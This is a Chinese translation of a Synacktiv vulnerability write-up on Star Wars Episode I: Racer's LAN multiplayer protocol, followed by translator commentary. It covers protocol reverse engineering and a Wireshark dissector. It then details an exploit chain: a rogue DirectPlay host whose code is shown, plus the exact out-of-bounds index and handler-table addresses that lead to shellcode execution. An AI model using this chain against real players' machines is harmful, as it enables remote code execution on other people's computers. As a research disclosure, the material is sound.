---
title: 【微信】星战赛车发售27年后被远程打穿：Synacktiv复现SWEP1R完整RCE链并开源PoC
source: https://mp.weixin.qq.com/s/nOVR5gJ6yQXt9ggMCqkgbQ
source_host: mp.weixin.qq.com
clip_date: 2026-11-23T08:37:24+08:00
trace_id: 817ac737-7769-4039-b738-270f60061a3e
content_hash: 0881ddc7924c571fb00338f0b89362e13d594525b84d391cc4cd831530f49427
status: synced
tags:
  - 微信
  - 漏洞分析
  - 协议分析
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: Synacktiv 逆向《星球大战前传一：极速飞梭》的局域网多人协议，利用 0x21 消息的越界写漏洞覆写 handler 表，取得远程代码执行，并开源 PoC。
ai_summary_style: key-points
images_status:
  total: 9
  succeeded: 9
  failed_urls: []
notion_page_id: 42175244-d011-81f5-8783-f7c8dfe538c2
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Synacktiv 逆向《星球大战前传一：极速飞梭》的局域网多人协议，利用 0x21 消息的越界写漏洞覆写 handler 表，取得远程代码执行，并开源 PoC。
> 
> - **协议栈定位：** 游戏通过 GOG 安装的 ipxwrapper 把 IPX 包封装进 UDP 54792；这套封装再交给 DirectPlay（COM 组件，CLSID_DirectPlay）处理。之所以如此，是因为 Windows Vista 起已停止对 IPX 的原生支持。
> - **dissector 流程可复用：** 先在 `packet-ipxwrapper.c` 中实现 `proto_register_*`、`proto_reg_handoff_*` 与 `dissector_add_uint("udp.port", 54792, …)`，再把 DirectPlay 作为子协议交给启发式 dissector；这样才能用 `play` 字符串识别协议。不过 Wireshark 原生启发式检查的偏移是 20，而游戏包中该字符串实际位于偏移 27。
> - **handler 表缺陷：** `wMsgId < 100` 却只初始化了 26 项；`Handler_21h` 直接用包内 `iIndex` 作为 `_g_PlayerStates[]` 的下标执行 `wcsncpy`（长度 0xF），索引 ≥20 就会越界写。
> - **利用链：** 用索引 0x01737B26 命中 0x004E9DE4，也就是 0x33 号消息的 handler 表项；把它改写为接收缓冲区 0xEC7BC8，再发送内含 shellcode 的 0x33 消息即可执行。
> - **前置条件：** 需要伪造房主身份（`guidApplication` 必须为 {C95FB584-FA31-11D2-909D00AA00A322AD}），处理 DPSYS_CREATEPLAYERORGROUP，并在收到玩家 0x22 后回复特制 0x21。已在 Windows 10 19045.2965 验证，PoC 位于 GitHub 上的 synacktiv/SWEP1RCR-exploit。

**赛博生存指南** *2026年11月19日 11:58*

> 原文：https://synacktiv.com/publications/star-wars-episode-i-racer  
> 作者：Synacktiv  
> 发布时间：2026-11-09  
> 翻译模型：GLM-5.3  
> 质量评分：★★★★½（4.5/5） ｜ 标签：漏洞利用 · 分析工具与方法论 · 红队工具链

**AI 摘要**：Synacktiv 对 1999 年 LucasArts 游戏《Star Wars Episode I: Racer》（GOG 版 1.0）的局域网多人协议做了完整逆向：游戏经 IPX wrapper（ipxwrapper 项目，UDP 54792）跑 DirectPlay，作者为其写了 Wireshark dissector（ `packet-ipxwrapper.c` ），再静态分析定位到消息 handler 表（理论 100 个、实际初始化 26 个）。0x21 号 handler 存在 out-of-bounds write——包内索引未经校验直接用于 `_g_PlayerStates[index].wzName` 的 `wcsncpy` 。利用链：伪造 0x21 消息用索引 0x01737B26 覆盖 handler 表里 0x33 号表项为接收缓冲区地址，再发一条带 shellcode 的 0x33 消息即获代码执行。Windows 10（19045.2965）实测通过，PoC 已开源。

这是今天五篇里「链路完整度」最高的一篇：从抓包起步，到 Wireshark dissector 开发、COM 组件静态分析、handler 表审计，最后落到一个可以精确控制写目标的 OOB write 上，全链一气呵成，且 PoC 直接开源。选择它还有一层考虑：老游戏（以及一切遗留 UDP 广播发现机制的对局软件）至今仍装在不少人的机器上，「局域网内任何人对玩家远程执行代码」这个威胁模型对电竞馆、公司内网都成立。与本仓库此前译介的协议逆向类文章相比，这篇的亮点是 dissector 开发流程本身可以直接套用到自己的目标上。

## 译文

《Star Wars Episode I: Racer》是 LucasArts 发行的竞速游戏，玩家像电影《星球大战前传一：幽灵的威胁》里那样驾驶飞行竞速器。本文详细分析它的多人游戏协议，以及一个可以远程代码执行的漏洞。我们还会讲 Wireshark dissector 的编写和 DirectPlay 工具开发。

## 引言

Star Wars Episode I: Racer 是 LucasArts 1999 年开发的竞速游戏，基于电影《星球大战前传一》里的飞梭竞速。研究对象是 GOG 发行的 Windows 平台 1.0 版。本文详细分析局域网多人模式所用协议。

![游戏截图：Star Wars Episode I: Racer](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4793718ca0951eec.jpg)

## 网络分析

第一步是流量分析。游戏装在同一个局域网的两台虚拟机上，下面这张 Wireshark 抓包展示了一个玩家（192.168.56.2）连接房主（192.168.56.104）时发出的包。

![Wireshark 抓包：客户端向广播地址发送的游戏发现包](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/8690043d402ad70d.jpg)

游戏多人模式通过 UDP 通信，目标端口 54792。客户端向广播地址 192.168.56.255 发包，局域网内所有机器都会收到。这是电子游戏在局域网内发现对局实例的常见机制。随后服务器向客户端回应一个包含游戏名的包。

上面的抓包里确实能看到游戏名 *MY Game: (null)*。Wireshark 没识别出子协议，但包里出现的 *play* 字符串可以当作 DirectPlay 协议的指示器。Wireshark 自带 DirectPlay dissector 的源码 `epan/dissectors/packet-dplay.c` 就用这个启发式判断 \[1\]：

```cpp
static bool heur_dissect_dplay(tvbuff_t *tvb, packet_info *pinfo, proto_tree *tree, void *data _U_)
{
    uint32_t dplay_id, token;

    if(tvb_captured_length(tvb) < 25)
        return false;

    /* The string play = 0x706c6179 */
    dplay_id = tvb_get_ntohl(tvb, 20); // [1]
    if( dplay_id == 0x706c6179) {
        dissect_dplay(tvb, pinfo, tree);
        return true;
    }
   [...]
}
```

然而 *play* 字符串位于偏移 27 而非 20，所以 DirectPlay 协议没被识别。我们尝试用逆向工程确认 DirectPlay 的使用。

### 静态分析

微软的 DirectPlay API 使用 COM（Component Object Model）模型。COM 是一套描述对象模型和编程要求的规范，让 COM 对象能与其他对象交互。实践中，一个 COM 对象（也叫组件）由唯一的 CLSID（Class Identifier）标识。Windows API `CoCreateInstance` 可以按 CLSID 创建并初始化 COM 对象。DirectPlay 库的头文件 `dplay.h` 给出了 DirectPlay 组件的 CLSID 和各接口的标识符。

```
/*
 * GUIDS used by DirectPlay objects
 */
DEFINE_GUID(IID_IDirectPlay2, 0x2b74f7c0, 0x9154, 0x11cf, 0xa9, 0xcd, 0x0, 0xaa, 0x0, 0x68, 0x86, 0xe3);
DEFINE_GUID(IID_IDirectPlay2A,0x9d460580, 0xa822, 0x11cf, 0x96, 0xc, 0x0, 0x80, 0xc7, 0x53, 0x4e, 0x82);

DEFINE_GUID(IID_IDirectPlay3, 0x133efe40, 0x32dc, 0x11d0, 0x9c, 0xfb, 0x0, 0xa0, 0xc9, 0xa, 0x43, 0xcb);
DEFINE_GUID(IID_IDirectPlay3A,0x133efe41, 0x32dc, 0x11d0, 0x9c, 0xfb, 0x0, 0xa0, 0xc9, 0xa, 0x43, 0xcb);

DEFINE_GUID(IID_IDirectPlay4, 0xab1c530, 0x4745, 0x11d1, 0xa7, 0xa1, 0x0, 0x0, 0xf8, 0x3, 0xab, 0xfc);
DEFINE_GUID(IID_IDirectPlay4A,0xab1c531, 0x4745, 0x11d1, 0xa7, 0xa1, 0x0, 0x0, 0xf8, 0x3, 0xab, 0xfc);

// {D1EB6D20-8923-11d0-9D97-00A0C90A43CB}
DEFINE_GUID(CLSID_DirectPlay,0xd1eb6d20, 0x8923, 0x11d0, 0x9d, 0x97, 0x0, 0xa0, 0xc9, 0xa, 0x43, 0xcb);
```

在 IDA 里做二进制搜索可以定位这个 CLSID，再通过交叉引用找到使用它的代码。实例化 DirectPlay 组件的函数伪代码如下：

```php
BOOL DPCreateInstance()
{
  IDirectPlay4::vtable *vftable; // edi
  GUID *guid; // eax

  CoInitialize(pvReserved: nullptr);
  CoCreateInstance(
    rclsid: &rclsid_DirectPlay,
    pUnkOuter: nullptr,
    dwClsContext: 1u,
    riid: &IDirectPlay4,
    ppv: (LPVOID *)&IDirectPlay4A);
  nConnection = 0;
  memset(g_ConnectionInfo, 0, 0x1180u); // [1]
  g_InSession = 0;
  dword_510258 = 0;
  vftable = IDirectPlay4A->vftable;
  guid = (GUID *)getAppGUID();
  return vftable->EnumConnections(self: IDirectPlay4A, guid, callback: EnumConnectionCallback, a4: 0, a5: 0) < 0; // [2]
```

对象初始化后，程序把一个 *ConnectionInfo_t* 结构体数组清零 \[1\]，随后通过 `EnumConnections` 方法间接填充——每发现一个网络 service provider 就调用一次回调 `EnumConnectionCallback` \[2\]。

```
struct ConnectionInfo_t
{
  wchar_t wzShortName[128];
  GUID pGUID;
  void *pOpaqueConnection;
  int dwConnectionSize;
};
```

每个网络 service provider 由 GUID 标识。DirectPlay 最初提供四种：

| Service Provider | GUID |
| --- | --- |
| Transmission Control Protocol/Internet Protocol (TCP/IP) | {36E95EE0-8577-11cf-960C-0080C7534E82} |
| Internetwork Packet Exchange (IPX) | {685BC400-9D2C-11cf-A9CD-00AA006886E3} |
| Modem | {44EAA760-CB68-11cf-9C4E-00A0C905425E} |
| Serial | {0F1D6860-88D9-11cf-9C4E-00A0C905425E} |

网络 service provider 注册在 Windows 注册表 `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\DirectPlay\Service Providers` 下。

![注册表：DirectPlay Service Providers 条目](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/e745a9c9a45694f7.jpg)

如下面的伪代码所示，程序遍历所有已安装的网络 service provider，并显式选择 IPX \[1\]：

```cpp
int InitializeIPXConnection()
{
  unsigned int v0; // ebp
  int index; // ebx
  ConnectionInfo_t connectionInfo; // [esp+10h] [ebp-118h] BYREF

  if ( dword_4EB398 != 0 )
    return 0;
  v0 = GetCountConnection();
  index = 0;
  if ( v0 == 0 )
    return 0;
  while ( 1 )
  {
    GetConnectionInfoByIndex(index, info: &connectionInfo);
    if ( memcmp(&connectionInfo.pGUID, &DPSPGUID_IPX, 0x10u) == 0 ) // [1]
      break;
    if ( ++index >= v0 )
      return 0;
  }
  g_ChoosenProvider = index;
  SetProvider(conn: index);
  dword_4EB398 = 1;
  return 1;
}
```

IPX 是 Novell 在 1980 年代开发的网络通信协议，无连接，工作在 OSI 模型的网络层（第 3 层），负责数据包的路由与转发。IPX 地址由三部分组成：

-   32 位的网络号
    
-   48 位的节点号，默认取机器的 MAC 地址
    
-   标识目标节点上应用或进程的 socket 号
    

Windows Vista 起官方停止支持 IPX。但游戏的安装脚本 `C:\GOG Games\STAR Wars Racer\directplay-win64.reg` 会专门安装 IPX service provider，安装目录里还有来自 *ipxwrapper* 项目的几个 DLL——该项目通过把 IPX 包封装进 UDP 数据报来模拟 IPX：

-   dpwsockx.dll：DirectPlay IPX service provider 的实现
    
-   ipxwrapper.dll：Windows socket 函数的实现
    
-   mswsock.dll：兼容 Windows socket 2 的 API（trampoline 到 ipxwrapper.dll）
    
-   wsock32.dll：兼容 Windows socket 1.1 的 API（trampoline 到 ipxwrapper.dll）
    

ipxwrapper 的源码初始化了一个监听 54792 端口的 UDP socket。根据 `src/router.c` ，DirectPlay 包被封装进 `src/ipxwrapper.h` 定义的 *ipx_packet* 结构：

```cpp
struct ipx_packet {
    uint8_t ptype;

    unsigned char dest_net[4];
    unsigned char dest_node[6];
    uint16_t dest_socket;

    unsigned char src_net[4];
    unsigned char src_node[6];
    uint16_t src_socket;

    uint16_t size;
    char data[1];
} __attribute__((__packed__));
```

有了这些信息就能解码之前抓到的游戏通告包头：

-   ptype（紫色）
    
-   dest_net（0x00000001）、dest_node（8E:E0:B5:8C:5E:B2）与 dest_socket（蓝色）
    
-   src_net（0x00000001）、src_node（93:57:94:89:8E:D2）与 src_socket（红色）
    
-   size（绿色）
    
-   DirectPlay 包（黄色）
    

![解码后的 IPX wrapper 包头各字段](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/10378e6a6a42baa4.jpg)

`C:\GOG Games\STAR Wars Racer\ipxconfig.exe` 可以查看本机的 IPX 配置，节点地址（8E:E0:B5:8C:5E:B2）和网络号都与上面解码出的包头一致。

![ipxconfig.exe 显示的 IPX 客户端配置](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/63c9db7f2fce88bb.jpg)

解码 IPX wrapper 包头的信息齐了，于是我们动手写 Wireshark dissector。DirectPlay 的 dissector（已原生支持）将被调用来解码 IPX 包的 *data* 部分。

## 编写 Wireshark dissector

首先在 `epan/dissectors/packet-ipxwrapper.c` 里定义一个最小化的 dissector。需要实现 `proto_register_XXX` 和 `proto_reg_handoff_XXX` 两个函数，XXX 是协议名，这里是 *ipxwrapper*。

`hf_register_info` 数组 \[1\] 描述包里每个字段：大小、以及在图形界面里的显示格式。

`proto_register_ipxwrapper` 负责注册协议及其元数据（会出现在应用菜单里）\[2\]。 `register_dissector_with_description` 把协议与 dissector 函数关联。当 Wireshark 检测到该协议、或用户用 "Decode As" 显式指定时，就会调用 `dissect_ipxwrapper` \[3\]。

`register_heur_dissector_list_with_description` 创建一个启发式 dissector 列表，供 IPX 包的 data 部分调用 \[4\]。

```cpp
void proto_register_ipxwrapper(void)
{
  static hf_register_info hf[] = { // [1]
        /* common header fields */
        {&hf_ipx_packet_type,
         {"Packet Type", "ipxwrapper.packet_type", FT_UINT8, BASE_HEX, NULL, 0x0,
          "Packet Type", HFILL}},
        {&hf_ipx_dnet,
         {"Destination Network", "ipxwrapper.dst.net", FT_IPXNET, BASE_NONE, NULL, 0x0,
          NULL, HFILL}},
        [...]
  };
  [...]
    proto_ipxwrapper = proto_register_protocol("IPX Wrapper", /* protocol name */
                                               "IPXWrapper",  /* protocol short name */
                                               "ipxwrapper"   /* protocol filter_name */
                                            ); // [2]
    ipxwrapper_handle = register_dissector_with_description(
        "ipxwrapper",           /* dissector name */
        "IPX Wrapper Protocol", /* dissector description */
        dissect_ipxwrapper,     /* dissector function */
        proto_ipxwrapper        /* protocol being dissected */
    ); // [3]

    heur_subdissector_list = register_heur_dissector_list_with_description("ipxwrapper",
    "IPX Wrapper heuristic",
    proto_ipxwrapper
    ); // [4]
  [...]
}
```

`proto_reg_handoff_ipxwrapper` 把协议绑定到 UDP 54792 端口的流量上：

```
void proto_reg_handoff_ipxwrapper(void)
{
    dissector_add_uint("udp.port", 54792, ipxwrapper_handle);
}
```

dissect 函数 `dissect_ipxwrapper` 先检查包长是否足够 \[1\]，然后用 `proto_tree_add_item` 把协议各字段加进树 \[2\]。字段定义在 `proto_register_ipxwrapper` 的 `hf` 数组里。

```cpp
static int
dissect_ipxwrapper(tvbuff_t *tvb, packet_info *pinfo, proto_tree *tree, _U_ void *data)
{

    guint32 offset = 0;
    guint tvb_len = tvb_captured_length(tvb);
    col_set_str(pinfo->cinfo, COL_PROTOCOL, "IPX");

    if (tvb_len < (1 + 4 + 6 + 2 + 4 + 6 + 2)) //  [1]
    {
        col_add_fstr(pinfo->cinfo, COL_INFO, "truncated IPX (%u bytes)", tvb_len);
        return tvb_len;
    }

    col_clear(pinfo->cinfo, COL_INFO);

    proto_item *ti = proto_tree_add_item(tree, proto_ipxwrapper, tvb, 0, -1, ENC_NA);
    proto_tree *ipx_tree = proto_item_add_subtree(ti, ett_ipxwrapper);

    proto_tree_add_item(ipx_tree, hf_ipx_packet_type, tvb, offset, 1, ENC_LITTLE_ENDIAN); // [2]
    offset += 1;

    proto_tree_add_item(ipx_tree, hf_ipx_dnet, tvb, offset, 4, ENC_BIG_ENDIAN);
    offset += 4;
    [...]
    tvbuff_t *next_tvb = tvb_new_subset_remaining(tvb, offset);

    heur_dtbl_entry_t* hdtbl_entry = NULL;
    if(!dissector_try_heuristic(heur_subdissector_list, next_tvb, pinfo, tree, &hdtbl_entry, data)) // [3]
    {
        call_data_dissector(next_tvb, pinfo, tree);
    }

    return tvb_captured_length(tvb);
}
```

最后一步是让 DirectPlay dissector 处理数据部分。但 DirectPlay 协议只在特定协议上注册启发式 dissector。 `heur_dissector_add` 方法把它加进前面在 `packet-ipxwrapper.c` 里初始化的启发式 dissector 列表：

```javascript
void proto_reg_handoff_dplay(void)
{
    heur_dissector_add("udp", heur_dissect_dplay, "DirectPlay over UDP", "dplay_udp", proto_dplay, HEURISTIC_DISABLE);
    heur_dissector_add("tcp", heur_dissect_dplay, "DirectPlay over TCP", "dplay_tcp", proto_dplay, HEURISTIC_DISABLE);
    heur_dissector_add("ipxwrapper", heur_dissect_dplay, "DirectPlay over IPX", "dplay_ipx", proto_dplay, HEURISTIC_DISABLE); // [1]
}
```

尽管如此，Wireshark 仍然认不出 DirectPlay 包。这是该软件目前的限制：只有使用 *DirectPlay 4 Reliable Protocol* 的包会被识别。按照文档，标记为可选的字段只在创建会话时设置了 DPSESSION_DIRECTPLAYPROTOCOL (0x2000) 标志才存在。

![DirectPlay 包头格式：可选字段依赖 DPSESSION\_DIRECTPLAYPROTOCOL 标志](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c0ee50a35b08e420.jpg)

虽然 DirectPlay 接口的 `Open` 方法调用时传入的会话描述符带有这个标志，但后面的一个函数显式关掉了这个参数 \[1\]：

```php
int __cdecl sub_486FC0(int a1, DWORD maxPlayer, int unknownBool)
{
  int v3; // edi
  LPDPSESSIONDESC2 session; // esi
  DWORD flags; // eax
  const wchar_t *lpszSessionName; // edx
  wchar_t *v7; // eax
  DWORD dwSize; // [esp+14h] [ebp-104h] BYREF
  wchar_t Destination[128]; // [esp+18h] [ebp-100h] BYREF

  v3 = 0;
  if ( IDirectPlay4A->vftable->GetSessionDesc(a1: IDirectPlay4A, a2: nullptr, a3: &dwSize) == 0x8877001E )
  {
    session = (LPDPSESSIONDESC2)(*(int (__cdecl **)(DWORD))(allocator + 32))(a1: dwSize);
    if ( session == nullptr || IDirectPlay4A->vftable->GetSessionDesc(a1: IDirectPlay4A, a2: session, a3: &dwSize) < 0 )
      goto LABEL_10;
    flags = session->dwFlags;
    LOBYTE(flags) = unknownBool != 0 ? flags & 0xDF : flags | DPSESSION_JOINDISABLED; // [1]
    lpszSessionName = session->lpszSessionName;
    session->dwFlags = flags;
    wcsncpy(Destination, Source: lpszSessionName, Count: 0x7Fu);
    Destination[127] = 0;
    v7 = wcsrchr(Str: Destination, Ch: 0x3Au);
    if ( v7 == nullptr
      || (_snwprintf(Buffer: v7 + 1, BufferCount: 0x20u, Format: L"%S", a1),
          session->lpszSessionName = Destination,
          session->dwMaxPlayers = maxPlayer,
          ((int (__stdcall *)(IDirectPlay4 *, LPDPSESSIONDESC2, _DWORD))IDirectPlay4A->vftable->SetSessionDesc)(
              a1: IDirectPlay4A,
              a2: session,
              a3: 0) < 0) )
    {
LABEL_10:
      v3 = 1;
    }
  }
  else
  {
    session = (LPDPSESSIONDESC2)dwSize;
    v3 = 1;
  }
  (*(void (__cdecl **)(LPDPSESSIONDESC2))(allocator + 36))(a1: session);
  return v3;
}
```

我们对 DirectPlay dissector 做了一些修改，以处理不带可选头的包。下面是修改后被 Wireshark 正确解码的抓包：

![修改 dissector 后 Wireshark 正确解码 IPX wrapper 内的 DirectPlay 包](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/344be7ac9e6ada69.jpg)

## 包处理逻辑的静态分析

接下来聚焦这个应用对 DirectPlay 包的处理。DirectPlay 消息的接收通过 *IDirectPlay4A* 接口的 `Receive` 方法完成。该方法可能返回错误码 DPERR_NOMESSAGES (0x887700BE)，使用 DirectPlay 的程序一般都会处理它。通过搜索这个常量找到了调用 `Receive` 的函数 \[1\]：

```kotlin
int __cdecl DPReceive(DPID *dpIdFrom, _DWORD *data, DWORD *dwDataSize_idTo)
{
  DWORD *lpDataSize; // ebx
  int v4; // eax
  int result; // eax

  lpDataSize = dwDataSize_idTo;
  v4 = IDirectPlay4A->vftable->Receive(
         this: IDirectPlay4A,
         lpidFrom: dpIdFrom,
         lpidTo: (DPID *)&dwDataSize_idTo,
         dwFlags: 1,
         lpData: data,
         lpdwDataSize: dwDataSize_idTo);
  if ( v4 < 0 )
    return (v4 == 0x887700BE) - 2; // [1]
  while ( *dpIdFrom == DPID_SYSMSG )
  {
    result = HandleSysMessage(message: data, playerIdOrGroup: dpIdFrom);
    if ( result != -1 )
      return result;
    v4 = IDirectPlay4A->vftable->Receive(
           this: IDirectPlay4A,
           lpidFrom: dpIdFrom,
           lpidTo: (DPID *)&dwDataSize_idTo,
           dwFlags: 1,
           lpData: data,
           lpdwDataSize: lpDataSize);
    if ( v4 < 0 )
      return (v4 == 0x887700BE) - 2;
  }
  return 0;
}
```

`HandleSysMessage` 处理一部分系统消息——用于管理游戏会话事件的消息。每条消息的结构在 DirectPlay 头文件里有定义，而用户消息由应用自定义：

-   DPSYS_CREATEPLAYERORGROUP：玩家或组被创建时发送
    
-   DPSYS_DESTROYPLAYERORGROUP：玩家或组被移除时发送
    
-   DPSYS_SESSIONLOST：DirectPlay 对象与会话中所有其他玩家失去连接时发送
    
-   DPSYS_HOST：房主退出会话时发送，当前 DirectPlay 实例成为新房主
    

处理用户消息的函数是沿 `Receive` 调用向上回溯找到的。0x21、0x22、0x28、0x20 这几类消息在玩家尚未完全加入对局时也会处理，如下面伪代码 \[1\] 所示。连接的最初几步靠 DirectPlay API 完成，但游戏自己也维护玩家状态，并为增删玩家实现了专有消息。

```php
int sub_41B7F0()
{
  int v0; // esi
  int result; // eax

  v0 = 0;
  result = sub_41D6B0();
  if ( result != 0 )
  {
    if ( dword_4E9EB0 != 0 )
    {
      dword_4E9EA8 = 0;
      do
      {
        if ( DequeuePacket(id: &txrx_packet) != 1 )
          break;
        ++v0;
        if ( txrx_packet.dpId != 0 )
        {
          if ( GetPlayerNumFromDPID(dpId: txrx_packet.dpId) >= 0
            || txrx_packet.buffer.generic.wMsgId == 0x21
            || txrx_packet.buffer.generic.wMsgId == 0x22
            || txrx_packet.buffer.generic.wMsgId == 0x28
            || txrx_packet.buffer.generic.wMsgId == 0x20 ) // [1]
          {
            if ( txrx_packet.buffer.generic.sequenceNum == 0
              || (sub_41B960(a1: txrx_packet.dpId, a2: txrx_packet.buffer.generic.sequenceNum),
                  CheckDuplicatePacket(dpId: txrx_packet.dpId, a2: txrx_packet.buffer.generic.sequenceNum) == 0) )
            {
              CallNetworkHandler(pkt: &txrx_packet);
            }
          }
```

对包内 wMsgId 字段的检查表明理论上存在 100 个不同的消息 handler \[1\]，但 *network_handlers_table* 表里实际只初始化了 26 项。

```cpp
int __cdecl CallNetworkHandler(RxPacket_t *pkt)
{
  unsigned int wMsgId; // eax
  CALLBACK_RX callback; // eax

  wMsgId = (unsigned __int16)pkt->buffer.generic.wMsgId;
  if ( (unsigned __int16)wMsgId < 100u && // [1]
      (callback = network_handlers_table[wMsgId]) != nullptr )
    return callback(packet: pkt);
  else
    return 1;
}
```

## 漏洞

处理 0x21 类型包的函数存在一个 out-of-bounds write。首先，一个整数 iIndex 直接取自网络包 \[1\]。随后程序用 `wcsncpy` 把 UTF-16 字符串复制进按索引选出的 STATE_T 结构体的 wzName 成员。索引大于等于 20 时，写入就会越过 `_g_PlayerStates` 数组的边界。

```php
int __cdecl Handler_21h(RxPacket_t *packet)
{
  int index; // esi

  index = packet->buffer.message_21h.iIndex; // [1]
  wcsncpy(
     Destination: _g_PlayerStates[index].wzName,  // [2]
     Source: packet->buffer.message_21h.wzName,
     Count: 0xFu );
  _g_PlayerStates[index].wzName[15] = 0;
  return 1;
}
```

## 利用

我们编写了一个基于 DirectPlay 的最小化服务器，向客户端发送特制的消息。首先用 `CoCreateInstance` API 拿到一个 DirectPlay 对象实例：

```
hr = CoCreateInstance(CLSID_DirectPlay, NULL, CLSCTX_INPROC_SERVER, IID_IDirectPlay4, (LPVOID *)&lpDirectPlay4);
```

然后程序通过 `EnumConnection` 和 `InitializeConnection` 方法选择 IPX 网络 service provider。IPX wrapper 的 DLL 必须放在服务器运行目录下。接着服务器用 `Open` 方法创建会话 \[1\]。第一个参数是会话描述符，指定最大玩家数、游戏名和 `guidApplication` 。这个唯一标识符必须与游戏《Star Wars Racer》的标识符 {C95FB584-FA31-11D2-909D00AA00A322AD} 一致。再用 `CreatePlayer` 方法创建一个玩家。同时创建一个 event 对象，收到发往该玩家的消息时它会被置位。消息处理的核心在 `ReceiveLoop` 函数 \[3\]。

```objectivec
  WCHAR sessionName[1024] = {0};
  wcscpy(sessionName, L"Test session");
  ZeroMemory(&sessionDesc, sizeof(DPSESSIONDESC2));
  sessionDesc.dwSize = sizeof(DPSESSIONDESC2);
  sessionDesc.dwFlags = DPSESSION_KEEPALIVE | DPSESSION_NODATAMESSAGES | DPSESSION_MIGRATEHOST;
  sessionDesc.guidApplication = GUID_StarWarsRacer;
  sessionDesc.dwMaxPlayers = 20;
  sessionDesc.lpszSessionName = sessionName;
  sessionDesc.dwUser3 = 1;
  sessionDesc.dwUser4 = 0xB4;
  sessionDesc.dwUser1 = 0x80000000;
  printf("[i] Hosting game ...\n");
  hr = lpDirectPlay4->Open(&sessionDesc, DPOPEN_CREATE); // [1]
  if (!SUCCEEDED(hr))
  {
      fprintf(stderr, "Open failed (0x%08.8x)\n", hr);
      return -1;
  }

  DPNAME dpName;
  WCHAR lpszPlayerName[256];
  wcscpy(lpszPlayerName, L"Player");
  ZeroMemory(&dpName, sizeof(DPNAME));
  dpName.dwSize = sizeof(DPNAME);
  dpName.lpszShortName = lpszPlayerName;

  HANDLE hPlayerEvent = CreateEvent(NULL,  // no security
                                  FALSE, // auto reset
                                  FALSE, // initial event reset
                                  NULL); // no name

  printf("[i] CreatePlayer ...\n");
  hr = lpDirectPlay4->CreatePlayer(&g_DPIDHostPlayer, &dpName, hPlayerEvent, NULL, 0, 0); // [2]
  if (!SUCCEEDED(hr))
  {
      fprintf(stderr, "CreatePlayer failed (0x%08.8x)\n", hr);
      return -1;
  }

  ReceiveLoop(lpDirectPlay4, hPlayerEvent); // [3]
```

该函数通过 `WaitForMultipleObjects` API 等待 DirectPlay 对象发来消息 \[1\]，再用 `Receive` 方法取出消息，它会返回发送者的标识符。应用要处理两类消息：发送者为 DPID_SYSMSG 的系统消息，以及《Star Wars Episode I: Racer》应用自身的消息。

```cpp
VOID ReceiveLoop(LPDIRECTPLAY4 lpDirectPlay4A, HANDLE hPlayerEvent)
{
    DPID idTo, idFrom;
    LPVOID lpvMsgBuffer;
    DWORD dwMsgBufferSize;
    HRESULT hr;

    lpvMsgBuffer = NULL;
    dwMsgBufferSize = 0;

    HANDLE eventHandles[2];
    eventHandles[0] = hPlayerEvent;

    while (WaitForMultipleObjects(1, eventHandles, FALSE, INFINITE) == WAIT_OBJECT_0) // [1]
    {
        idFrom = 0;
        idTo = 0;
        hr = lpDirectPlay4A->Receive(&idFrom, &idTo, DPRECEIVE_ALL, lpvMsgBuffer, &dwMsgBufferSize);
        if (hr == DPERR_BUFFERTOOSMALL)
        {
            if (lpvMsgBuffer)
                free(lpvMsgBuffer);
            lpvMsgBuffer = malloc(dwMsgBufferSize);
            hr = lpDirectPlay4A->Receive(&idFrom, &idTo, DPRECEIVE_ALL, lpvMsgBuffer, &dwMsgBufferSize);
        }

        if (!SUCCEEDED(hr))
        {
            printf("Receive error : %08.8x\n", hr);
            break;
        }

        if (idFrom == DPID_SYSMSG)
        {
            HandleSystemMessage(lpDirectPlay4A, (LPDPMSG_GENERIC)lpvMsgBuffer, dwMsgBufferSize, idFrom, idTo);
        }
        else
        {
            [...]
        }
    }
}
```

系统消息总是以一个指示类型的 DWORD 开头，其余字段按类型定义。服务器应用必须处理 DPSYS_CREATEPLAYERORGROUP 系统消息：玩家连接时，服务器记下其标识符，以便稍后投递载荷。第一步，服务器回应一条 0x20 类型的专有消息，内容是当前会话里的活跃玩家列表。

![0x20 消息结构](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a4f29c556d1852da.jpg)

利用在目标玩家发出 0x22 类型消息时触发。这条消息由客户端在连接后发出，同样带有玩家名。

利用方式是回应一条 0x21 类型消息，覆盖 `network_handlers_table` 表里的一个 handler。索引设为 0x01737B26 即可命中地址 0x004E9DE4——0x33 号消息的 handler 表项。该表项被替换成 0xEC7BC8，即接收缓冲区的地址。

![0x21 消息结构：iIndex 用于精确控制覆写目标](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/f4164c4cdc5528d3.jpg)

随后再发一条 0x33 类型消息、内含 shellcode，程序就会执行包里收到的代码。

## 结论

我们在 Windows 10 ver 10.0.19045.2965 测试环境里完成了这个漏洞的利用。PoC 出于教育目的在以下地址公开：https://github.com/synacktiv/SWEP1RCR-exploit

## 译者补充：几点解读与延伸

**一、「理论 100 项、实际 26 项」的 handler 表是这类老游戏代码的通病。** 消息 ID 按 100 取模查表，表里只有 26 项有值——0x21 的越界写之所以能精确覆盖 0x33 的表项，正是因为攻击者同时控制了「写什么」和「写到哪」。凡是「包内索引直接进数组下标」的模式，都值得在自己的目标里搜一遍。

**二、dissector 先行的分析方法可以复用。** 先抓包、再写 Wireshark dissector 把协议字段摊开、最后才进 IDA——这个顺序让后面的静态分析始终有流量对照。Synacktiv 把 dissector 开发写成了完整一节（含 Wireshark 对 DirectPlay 4 Reliable Protocol 的识别限制和绕法），拿任何私有 UDP 协议当目标都能照抄流程。

**三、威胁模型的现实面。** GOG 重制的老游戏默认走 IPX wrapper（UDP 广播发现对局），同一局域网内任何人都扮演「恶意房主」。本文成稿时游戏发行已 27 年，但 GOG 版至今在售——老协议、老代码、现代网络环境，这三者叠出来的攻击面比直觉大。

## 参考

-   Star Wars Episode I: Racer（原文，法语）：https://synacktiv.com/publications/star-wars-episode-i-racer
    
